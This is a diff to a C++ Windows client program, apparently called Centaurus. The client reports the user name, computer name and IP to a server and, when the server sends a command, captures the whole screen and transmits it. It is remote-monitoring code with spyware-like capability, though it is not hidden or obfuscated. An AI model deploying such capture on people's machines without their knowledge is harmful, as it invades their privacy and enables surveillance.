@@ -93,7 +93,7 @@ std::string getLocalIPv4() {
     return "";
 }
 
-void Client::sendString(SOCKET sock, const std::string& str) {
+void Client::sendData(SOCKET sock, const std::string& str) {
     int strSize = static_cast<int>(str.size());
     
     // Сначала отправляем размер строки
@@ -115,138 +115,142 @@ void Client::sendString(SOCKET sock, const std::string& str) {
     }
 }
 
+void Client::sendData(SOCKET sock, const std::vector<char>& data) {
+    int dataSize = static_cast<int>(data.size());
+
+    // Отправляем размер данных
+    int sizeSent = send(sock, reinterpret_cast<const char*>(&dataSize), sizeof(dataSize), 0);
+    if (sizeSent == SOCKET_ERROR) {
+        std::cerr << "Failed to send data size, error: " << WSAGetLastError() << std::endl;
+        return;
+    }
+
+    // Отправляем сами данные
+    int totalBytesSent = 0;
+    while (totalBytesSent < dataSize) {
+        int bytesSent = send(sock, data.data() + totalBytesSent, dataSize - totalBytesSent, 0);
+        if (bytesSent == SOCKET_ERROR) {
+            std::cerr << "Failed to send data, error: " << WSAGetLastError() << std::endl;
+            break;
+        }
+        totalBytesSent += bytesSent;
+    }
+}
+
+
 /**
  * Отправить основную информацию о текущем клиенте.
  */
 void Client::sendClientInfo() const
 {
-    // Время подключения
     auto now = std::chrono::system_clock::now();
     std::time_t currentTime = std::chrono::system_clock::to_time_t(now);
     std::stringstream timeStream;
     timeStream << std::put_time(std::localtime(&currentTime), "%d-%m-%Y %H:%M:%S");
 
-    // Имя пользователя
     char username[UNLEN + 1];
     DWORD username_len = UNLEN + 1;
     GetUserNameA(username, &username_len);
 
-    // Имя компьютера
     char computerName[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD computerName_len = MAX_COMPUTERNAME_LENGTH + 1;
     GetComputerNameA(computerName, &computerName_len);
 
-    // IP-адрес
     std::string ipAddress = getLocalIPv4(); // Используем IP-адрес сервера для упрощения
 
-    sendString(m_socket, Centaurus::cmd::connect);
+    sendData(m_socket, Centaurus::cmd::connect);
     std::string timeStr = timeStream.str();
-    sendString(m_socket, timeStr);
-    sendString(m_socket, username);
-    sendString(m_socket, computerName);
-    sendString(m_socket, ipAddress);
-    // // Собираем информацию в строку
-    // std::stringstream infoStream;
-    // infoStream << Centaurus::cmd::connect;
-    // infoStream << timeStream.str().size() << timeStream.str();
-    // infoStream << std::strlen(username) << username << " | ";
-    // infoStream << std::strlen(computerName) << computerName << " | ";
-    // infoStream << ipAddress.length() << ipAddress;
-    //
-    // // Отправляем информацию на сервер
-    // std::string clientInfo = infoStream.str();
-    // int sendResult = send(m_socket, clientInfo.c_str(), clientInfo.size() + 1, 0);
-    // if (sendResult == SOCKET_ERROR)
-    // {
-    //     std::cerr << "Failed to send client info, error: " << WSAGetLastError() << std::endl;
-    // }
+    sendData(m_socket, timeStr);
+    sendData(m_socket, username);
+    sendData(m_socket, computerName);
+    sendData(m_socket, ipAddress);
 }
 
 /**
  * Обработка снимка экрана и запись в файл (*bmp).
- * @param wPath Путь к файлу.
  */
 std::vector<BYTE> Client::captureScreenshot() {
-    // Изменяем метод на возврат вектора байтов
-    HDC hDC = GetDC(NULL);
-    HDC hMemDC = CreateCompatibleDC(hDC);
-    
-    // Получаем размеры экрана
-    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
-    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
-    
-    HBITMAP hBitmap = CreateCompatibleBitmap(hDC, width, height);
+    BITMAPFILEHEADER bfHeader;
+    BITMAPINFOHEADER biHeader;
+    BITMAPINFO bInfo;
+    HGDIOBJ hTempBitmap;
+    HBITMAP hBitmap;
+    BITMAP bAllDesktops;
+    HDC hDC, hMemDC;
+    LONG lWidth, lHeight;
+    BYTE* bBits = NULL;
+    DWORD cbBits;
+    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);
+
+    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
+    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
+    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
+    ZeroMemory(&bAllDesktops, sizeof(BITMAP));
+
+    hDC = GetDC(NULL);
+    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
+    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);
+
+    lWidth = bAllDesktops.bmWidth;
+    lHeight = bAllDesktops.bmHeight;
+
+    DeleteObject(hTempBitmap);
+
+    bfHeader.bfType = (WORD)('B' | ('M' << 8));
+    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+    biHeader.biSize = sizeof(BITMAPINFOHEADER);
+    biHeader.biBitCount = 24; // 24 бита на пиксель
+    biHeader.biCompression = BI_RGB; // Без сжатия
+    biHeader.biPlanes = 1;
+    biHeader.biWidth = lWidth;
+    biHeader.biHeight = lHeight;
+
+    bInfo.bmiHeader = biHeader;
+
+    cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;
+
+    hMemDC = CreateCompatibleDC(hDC);
+    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
     SelectObject(hMemDC, hBitmap);
-    
-    // Копируем данные с экрана
-    BitBlt(hMemDC, 0, 0, width, height, hDC, 0, 0, SRCCOPY);
-    
-    // Создаем заголовок BMP
-    BITMAPFILEHEADER bmfHeader;
-    BITMAPINFOHEADER bi;
-    bi.biSize = sizeof(BITMAPINFOHEADER);
-    bi.biWidth = width;
-    bi.biHeight = height;
-    bi.biPlanes = 1;
-    bi.biBitCount = 24; // 24 бита на пиксель
-    bi.biCompression = BI_RGB;
-    bi.biSizeImage = 0;
-    bi.biXPelsPerMeter = 0;
-    bi.biYPelsPerMeter = 0;
-    bi.biClrUsed = 0;
-    bi.biClrImportant = 0;
 
-    // Выделяем память для данных изображения
-    std::vector<BYTE> imageData(width * height * 3 + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER));
-    DWORD dwSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
-    
-    // Заполняем заголовок BMP
-    bmfHeader.bfType = 'MB';
-    bmfHeader.bfSize = dwSize + imageData.size() - sizeof(BITMAPFILEHEADER);
-    bmfHeader.bfReserved1 = 0;
-    bmfHeader.bfReserved2 = 0;
-    bmfHeader.bfOffBits = dwSize;
+    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);
 
-    // Копируем данные в вектор
-    memcpy(imageData.data(), &bmfHeader, sizeof(BITMAPFILEHEADER));
-    memcpy(imageData.data() + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
-    GetDIBits(hDC, hBitmap, 0, height, imageData.data() + dwSize, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
+    std::vector<BYTE> imageData(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + cbBits);
+    memcpy(imageData.data(), &bfHeader, sizeof(BITMAPFILEHEADER));
+    memcpy(imageData.data() + sizeof(BITMAPFILEHEADER), &biHeader, sizeof(BITMAPINFOHEADER));
+    memcpy(imageData.data() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), bBits, cbBits);
 
-    // Освобождаем ресурсы
-    DeleteObject(hBitmap);
     DeleteDC(hMemDC);
     ReleaseDC(NULL, hDC);
+    DeleteObject(hBitmap);
 
-    return imageData; // Возвращаем данные изображения
+    return imageData;
 }
+
+
 
 /**
  * Обработка и отправка на сервер снимка экрана.
  */
 void Client::sendScreenshot(SOCKET sock) {
-    // Захватываем скриншот и получаем данные
     std::vector<BYTE> screenshotData = captureScreenshot();
 
-    // Сначала отправляем команду "/scn" для запроса на сервере
-    const std::string command = "/scn";
-    int commandSent = send(sock, command.c_str(), command.size(), 0);
+    int commandSent = send(sock, Centaurus::cmd::screenshot.c_str(), Centaurus::cmd::screenshot.size(), 0);
     if (commandSent == SOCKET_ERROR) {
         std::cerr << "Failed to send screenshot command, error: " << WSAGetLastError() << std::endl;
         return;
     }
     
-    // Отправляем данные скриншота
     int totalBytesSent = 0;
     int dataSize = static_cast<int>(screenshotData.size());
     
-    // Отправляем размер данных перед отправкой самого изображения
     int sizeSent = send(sock, reinterpret_cast<char*>(&dataSize), sizeof(dataSize), 0);
     if (sizeSent == SOCKET_ERROR) {
         std::cerr << "Failed to send data size, error: " << WSAGetLastError() << std::endl;
         return;
     }
 
-    // Теперь отправляем данные скриншота
     while (totalBytesSent < dataSize) {
         int bytesSent = send(sock, reinterpret_cast<char*>(screenshotData.data()) + totalBytesSent, dataSize - totalBytesSent, 0);
         if (bytesSent == SOCKET_ERROR) {
@@ -270,7 +274,7 @@ void Client::listenForCommands() const
         if (bytesReceived != SOCKET_ERROR)
         {
             std::string command(buf, 0, bytesReceived);
-            if (command == "/scn")
+            if (command == Centaurus::cmd::screenshot)
             {
                 std::cout << "Received screenshot command" << std::endl;
                 sendScreenshot(m_socket);
